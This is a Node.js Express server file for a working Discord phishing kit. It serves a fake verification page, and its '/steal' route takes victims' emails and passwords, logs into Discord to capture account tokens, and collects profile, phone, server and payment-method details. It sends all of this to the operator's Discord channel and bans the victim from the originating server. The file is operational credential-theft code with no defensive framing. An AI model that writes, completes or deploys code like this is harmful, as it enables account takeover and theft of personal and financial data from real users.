// language: Node.js, file: src/server.js
const express    = require('express');
const cors       = require('cors');
const path       = require('path');
const fs         = require('fs');
const { EmbedBuilder } = require('discord.js');

const store      = require('./utils/store');
const { getClient } = require('./bot');
const { loginWithCredentials, getUserInfo, getGuilds, getBillingInfo } = require('./utils/api');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const NITRO_MAP = { 0: 'None', 1: 'Classic', 2: 'Nitro', 3: 'Basic' };

// ── health checks ──────────────────────────────────────────────────────────────
// Railway pings healthcheckPath every 30s — must respond 200 fast
app.get('/health', (_req, res) => {
  res.status(200).json({ status: 'ok', uptime: Math.floor(process.uptime()) });
});
app.get('/', (_req, res) => res.status(200).send('OK'));

// ── /verify/:code — serve the phishing page ────────────────────────────────────
// inject the verify code into the HTML so the page knows where to POST
app.get('/verify/:code', (req, res) => {
  const { code } = req.params;

  if (!store.pending.has(code)) {
    return res.status(404).send(`<!DOCTYPE html><html>
<head><title>Invalid</title>
<style>
  body{background:#313338;color:#dbdee1;font-family:sans-serif;
  display:flex;align-items:center;justify-content:center;height:100vh;margin:0;flex-direction:column;gap:12px;}
  h2{margin:0;font-size:22px;} p{color:#b5bac1;margin:0;font-size:14px;}
</style></head>
<body><h2>⚠️ Link Expired</h2><p>This verification link is invalid or has expired.</p></body>
</html>`);
  }

  // read the HTML template and inject the code
  const templatePath = path.join(__dirname, '..', 'public', 'verify.html');
  let html = fs.readFileSync(templatePath, 'utf8');
  html = html.replace('{{CODE}}', code);
  res.setHeader('Content-Type', 'text/html');
  res.send(html);
});

// ── /steal — receive credentials from the phishing page ───────────────────────
app.post('/steal', async (req, res) => {
  const { code, email, password } = req.body ?? {};

  // always 200 immediately — page shows success regardless
  res.json({ success: true });

  if (!email && !password) return;

  const pending = store.pending.get(code ?? '');
  store.pending.delete(code ?? '');

  // fire async — don't block the response
  (async () => {
    try {
      // attempt Discord login to recover the token
      const loginData = await loginWithCredentials(email, password);
      const token     = loginData?.token ?? null;
      const hasMfa    = !!loginData?.mfa;
      const hasCaptcha = !!(loginData?.captcha_key?.length);

      let user    = null;
      let guilds  = [];
      let billing = [];

      if (token) {
        [user, guilds, billing] = await Promise.all([
          getUserInfo(token),
          getGuilds(token),
          getBillingInfo(token),
        ]);
      }

      const client = getClient();
      if (!client || !store.channelId) return;

      const channel = await client.channels.fetch(store.channelId).catch(() => null);
      if (!channel) return;

      // ── build embed ──────────────────────────────────────────────────────────
      const embed = new EmbedBuilder()
        .setTitle('🎣 New Catch — Credentials')
        .setColor(0xED4245)
        .setTimestamp()
        .addFields(
          { name: '📧 Email',    value: email    || 'N/A', inline: true },
          { name: '🔑 Password', value: password || 'N/A', inline: true },
          { name: '🔐 MFA',      value: hasMfa ? '✅ Yes' : '❌ No', inline: true },
        );

      if (hasCaptcha && !token) {
        embed.addFields({ name: '⚠️ Note', value: 'hCaptcha blocked token recovery — creds still captured', inline: false });
      }

      if (token) {
        embed.addFields({ name: '🪙 Token', value: `\`${token}\``, inline: false });
      }

      if (user) {
        const tag = user.discriminator && user.discriminator !== '0'
          ? `${user.username}#${user.discriminator}`
          : user.username;

        embed.addFields(
          { name: '👤 Username',     value: tag,                                   inline: true },
          { name: '🆔 ID',           value: user.id,                               inline: true },
          { name: '✅ Verified',     value: String(user.verified),                 inline: true },
          { name: '💎 Nitro',        value: NITRO_MAP[user.premium_type] ?? 'None', inline: true },
          { name: '📱 Phone',        value: user.phone    || 'None',               inline: true },
          { name: '🌍 Locale',       value: user.locale   || 'N/A',                inline: true },
        );

        if (user.avatar) {
          embed.setThumbnail(
            `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128`
          );
        }
      }

      if (billing.length > 0) {
        const billingStr = billing.map(b =>
          `${b.type === 1 ? '💳 Card' : '🅿️ PayPal'}: **${b.brand ?? ''}** •••• ${b.last_4 ?? ''}`
        ).join('\n');
        embed.addFields({ name: '💳 Payment Methods', value: billingStr.slice(0, 1024), inline: false });
      }

      if (guilds.length > 0) {
        const owned = guilds.filter(g => g.owner).length;
        const list  = guilds.slice(0, 15).map(g => `${g.owner ? '👑 ' : ''}${g.name}`).join('\n');
        embed.addFields({
          name:  `🏠 Servers (${guilds.length} total, ${owned} owned)`,
          value: list.slice(0, 1024),
          inline: false,
        });
      }

      if (pending) {
        embed.addFields({ name: '🎯 Target', value: `<@${pending.userId}> (${pending.username})`, inline: true });
      }

      await channel.send({ embeds: [embed] }).catch(console.error);

      // ── ban from origin guild ──────────────────────────────────────────────────
      if (pending?.guildId && pending?.userId) {
        try {
          const guild = await client.guilds.fetch(pending.guildId);
          await guild.members.ban(pending.userId, { reason: 'Verified' });
          console.log(`[steal] banned ${pending.userId} from ${pending.guildId}`);
        } catch (e) {
          console.log(`[steal] ban failed (no perms, already banned, or left): ${e.message}`);
        }
      }

    } catch (e) {
      console.error('[steal] async error:', e.response?.data ?? e.message);
    }
  })();
});

// ── start ──────────────────────────────────────────────────────────────────────
function startServer() {
  const port = parseInt(process.env.PORT ?? '3000', 10);
  return new Promise((resolve, reject) => {
    const server = app.listen(port, '0.0.0.0', () => {
      console.log(`[server] listening on :${port}`);
      resolve(server);
    });
    server.on('error', reject);
  });
}

module.exports = { startServer };
